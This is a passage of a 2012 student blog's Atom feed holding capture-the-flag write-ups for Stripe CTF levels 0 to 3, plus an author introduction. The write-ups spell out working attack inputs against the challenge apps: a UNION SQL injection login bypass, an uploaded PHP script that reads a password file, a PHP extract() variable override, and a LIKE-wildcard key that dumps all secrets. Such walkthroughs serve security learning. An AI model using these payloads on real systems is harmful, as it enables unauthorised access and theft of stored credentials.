    &lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;users.db&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;SELECT id, password_hash, salt FROM users&lt;/span&gt;
&lt;span class="s2"&gt;            WHERE username = &amp;#39;{0}&amp;#39; LIMIT 1&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;There&amp;#39;s no such user {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;

    &lt;span class="n"&gt;calculated_hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;calculated_hash&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;That&amp;#39;s not the password for {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_id&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wow. Hashed passwords, and even salt! Seems pretty secure. But the
statements aren't prepared: they are vulnerable to SQL injection. We are
gonna use a &lt;code&gt;UNION&lt;/code&gt; statement, to force the id, the password's
hash and the salt to be arbitrary values. We can see from the
&lt;code&gt;generate_data.py&lt;/code&gt; file that the default users were added in a
random order, so we don't know what bob's id is. Since there are only
three values, we can try each by hand. For the sake of simplicity, we'll
suppose here that bob's id is 1.&lt;/p&gt;
&lt;p&gt;So, let's say we put this as a user in the form:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dummy-user' UNION SELECT 1, 'hash', 'salt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The statement will become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;dummy-user&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hash&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;salt&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This way, the first part of the statement will yield an empty row, and
the second part will yield 1, 'hash', 'salt'. If we want to connect with
the password 'foo', with the salt 'bar', we can compute the password's
hash:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sha256('foobar') =
c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We fill the form this way:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user = dummy-user' UNION SELECT 1,
'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
'bar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;and&lt;/p&gt;
&lt;p&gt;&lt;code&gt;password = foo&lt;/code&gt;&lt;/p&gt;
&lt;img alt="level03-filled-form.png" class="align-center" src="/images/stripe-ctf-level-3/level03-filled-form.png" /&gt;
&lt;p&gt;We just have to submit to retrieve bob's secret:&lt;/p&gt;
&lt;img alt="level03-w00t.png" class="align-center" src="/images/stripe-ctf-level-3/level03-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #2</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-2/" rel="alternate"></link><published>2012-10-13T16:11:00+02:00</published><updated>2012-10-13T16:11:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:/posts/2012/10/13/stripe-ctf-level-2/</id><summary type="html">&lt;img alt="level02-logo.png" class="align-center" src="/images/stripe-ctf-level-2/level02-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-2/level02-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;d175b624ed888badd795c5474ae855f711e856cc41c0757059594babe8f23413&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a whole social network!&lt;/p&gt;
&lt;p&gt;Okay, it's not, it's just a page with a profile picture. But on the
bottom of the page, you can see something interesting: &amp;quot;Password for
Level 3 (accessible only to members of …&lt;/p&gt;</summary><content type="html">&lt;img alt="level02-logo.png" class="align-center" src="/images/stripe-ctf-level-2/level02-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-2/level02-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;d175b624ed888badd795c5474ae855f711e856cc41c0757059594babe8f23413&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a whole social network!&lt;/p&gt;
&lt;p&gt;Okay, it's not, it's just a page with a profile picture. But on the
bottom of the page, you can see something interesting: &amp;quot;Password for
Level 3 (accessible only to members of the club)&amp;quot;. Of course, if you
click on it it doesn't work. Let's see how we can access this file.&lt;/p&gt;
&lt;p&gt;The key here is that you can upload your picture so that it's displayed
on your profile page.&lt;/p&gt;
&lt;img alt="level02-uploaded-picture.png" class="align-center" src="/images/stripe-ctf-level-2/level02-uploaded-picture.png" /&gt;
&lt;p&gt;But if you look at the code, you can see that no check is performed on
the file you upload. Which means you can upload &lt;strong&gt;any&lt;/strong&gt; file, not just a
picture.&lt;/p&gt;
&lt;p&gt;You also know where your &amp;quot;picture&amp;quot; is stored: uploads/your_file. So we
can upload a PHP script that'll open the password file, and visit the
URL where it's located to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="nv"&gt;$content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;../password.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$content&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's name this file exploit.php. We upload it:&lt;/p&gt;
&lt;img alt="level02-uploaded-script.png" class="align-center" src="/images/stripe-ctf-level-2/level02-uploaded-script.png" /&gt;
&lt;p&gt;We can see that no image is displayed (because your browser can't
display the script as an image), yet the server says it was successfully
uploaded. Now, we just have to go to upoads/exploit.php, and &lt;strong&gt;bam!&lt;/strong&gt;
you have the password for this level.&lt;/p&gt;
&lt;img alt="level02-executing-script.png" class="align-center" src="/images/stripe-ctf-level-2/level02-executing-script.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #1</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-1/" rel="alternate"></link><published>2012-10-13T15:52:00+02:00</published><updated>2012-10-13T15:52:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:/posts/2012/10/13/stripe-ctf-level-1/</id><summary type="html">&lt;img alt="level01-logo.jpg" class="align-center" src="/images/stripe-ctf-level-1/level01-logo.jpg" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-1/level01-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;b67c313a1a3bebd8702159efae32f95f1b41885f6e00103ee53e896a53194f43&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level wants you to guess a password, stored in a file named
&amp;quot;secret-combination.txt&amp;quot; on the server. If you manage to do it, it'll
give you the password for this level. Let's take a look at the …&lt;/p&gt;</summary><content type="html">&lt;img alt="level01-logo.jpg" class="align-center" src="/images/stripe-ctf-level-1/level01-logo.jpg" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-1/level01-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;b67c313a1a3bebd8702159efae32f95f1b41885f6e00103ee53e896a53194f43&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level wants you to guess a password, stored in a file named
&amp;quot;secret-combination.txt&amp;quot; on the server. If you manage to do it, it'll
give you the password for this level. Let's take a look at the code and
see how to get the password without knowing the combination.&lt;/p&gt;
&lt;p&gt;The server starts by defining a variable &lt;code&gt;$filename&lt;/code&gt; equal
to &amp;quot;secret-combination.txt&amp;quot;. That's the file of the combination (I'm so
deductive). It then retrieves your attempt (which was passed by &lt;code&gt;GET&lt;/code&gt;),
and compares it to the content of the file. If they're the same, the
server will gives you the sweet, sweet password. Otherwise, tough.&lt;/p&gt;
&lt;img alt="level01-failed-attempt.png" class="align-center" src="/images/stripe-ctf-level-1/level01-failed-attempt.png" /&gt;
&lt;p&gt;The thing is, the server doesn't retrieve your attempt using
&lt;code&gt;$_GET['attempt']&lt;/code&gt;. It uses the &lt;a class="reference external" href="http://php.net/manual/en/function.extract.php"&gt;extract PHP
function&lt;/a&gt; on the
&lt;code&gt;$_GET&lt;/code&gt; array. Basically, for every entry &lt;code&gt;$_GET['key'] = value&lt;/code&gt;,
it’ll create a variable &lt;code&gt;$key&lt;/code&gt; with the value
&lt;code&gt;value&lt;/code&gt;. It means that if we give a parameter filename in the
&lt;code&gt;GET&lt;/code&gt; request, we can override the variable &lt;code&gt;$filename&lt;/code&gt;, and open
any file. So let's open a non-existing file, and give an empty guess:
&lt;code&gt;?attempt=&amp;amp;filename=dummy-filename.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This request will set &lt;code&gt;$filename&lt;/code&gt; to &amp;quot;dummy-filename.txt&amp;quot;, so
that when the server tries to retrieve its content, it'll yield an empty
string. Since our attempt is empty, it will match, and the server will
give us the password for this level.&lt;/p&gt;
&lt;img alt="level01-success-attempt.png" class="align-center" src="/images/stripe-ctf-level-1/level01-success-attempt.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #0</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-0/" rel="alternate"></link><published>2012-10-13T15:41:00+02:00</published><updated>2012-10-13T15:41:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:/posts/2012/10/13/stripe-ctf-level-0/</id><summary type="html">&lt;img alt="level00-logo.png" class="align-center" src="/images/stripe-ctf-level-0/level00-logo.png" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-0/level00-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;da9712a1851597d6d4b5a90224a1d0fcaa4b558f55a10ca0c7a115d18fe9dcb7&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level is a safe that keeps your secrets for you. But it also
keeps secrets for other people. Let's find out how we can recover the
password for this level.&lt;/p&gt;
&lt;p&gt;The page is a simple form with …&lt;/p&gt;</summary><content type="html">&lt;img alt="level00-logo.png" class="align-center" src="/images/stripe-ctf-level-0/level00-logo.png" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-0/level00-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;da9712a1851597d6d4b5a90224a1d0fcaa4b558f55a10ca0c7a115d18fe9dcb7&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level is a safe that keeps your secrets for you. But it also
keeps secrets for other people. Let's find out how we can recover the
password for this level.&lt;/p&gt;
&lt;p&gt;The page is a simple form with three fields: your key, your secret
and the name of your secret. When you post these values, they are
registered in a database in this format: (key.secret_name, secret).&lt;/p&gt;
&lt;p&gt;The safe gives you the possibility to retrieve your secrets by entering
your key (otherwise, it'd be a stupid safe). Then, it'll do a SQL query
to get every entry which looks like this: (entered_key.anything,
anything). The SQL query is this one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;.%&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It's a prepared query, used to prevent SQL injection (with quotes and
the like). The ? will be replaced by the value you send to the server.
The &lt;code&gt;LIKE&lt;/code&gt; keyword is used to match a string against a regexp.
The % means &amp;quot;any number of any characters&amp;quot; (kind of like the *).&lt;/p&gt;
&lt;p&gt;The problem with this is that the key you enter is not sanitized. Well,
it's sanitized by the prepared query so that you cannot perform SQL.
But it's not sanitized for the &lt;code&gt;LIKE&lt;/code&gt; syntax. So
let's say you enter % as a key, the query will look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It means &amp;quot;select every secret where the key has the form
'any_characters.any_characters'&amp;quot;. And that's every secret! So the safe
will give you every secret stored, and thus, the password for this
level.&lt;/p&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>#define AUTHOR Yannick Méheut</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/define-author-yannick-meheut/" rel="alternate"></link><published>2012-10-13T03:09:00+02:00</published><updated>2012-10-13T03:09:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:/posts/2012/10/13/define-author-yannick-meheut/</id><summary type="html">&lt;p&gt;Hi everyone!&lt;/p&gt;
&lt;p&gt;My name is Yannick, I'm a 22 year-old student at the French engineer
school Télécom ParisTech. I study cryptography and info/netsec. Although
I find these topics fascinating, I'm pretty new to this world.&lt;/p&gt;
&lt;img alt="yannick.jpg" class="align-center" src="/images/define-author-yannick-meheut/yannick.jpg" /&gt;
&lt;p&gt;Last month, I decided to participate to the Stripe CTF, and,
unexpectedly, I managed …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hi everyone!&lt;/p&gt;
&lt;p&gt;My name is Yannick, I'm a 22 year-old student at the French engineer
school Télécom ParisTech. I study cryptography and info/netsec. Although
I find these topics fascinating, I'm pretty new to this world.&lt;/p&gt;
&lt;img alt="yannick.jpg" class="align-center" src="/images/define-author-yannick-meheut/yannick.jpg" /&gt;
&lt;p&gt;Last month, I decided to participate to the Stripe CTF, and,
unexpectedly, I managed to capture the flag, yay! I chose to create a
blog to post my write-ups, to leave a trace of my participation, and
later post news from the info/netsec world.&lt;/p&gt;
&lt;p&gt;Hope you have a nice time,&lt;/p&gt;
&lt;p&gt;Cheers.&lt;/p&gt;
</content></entry></feed>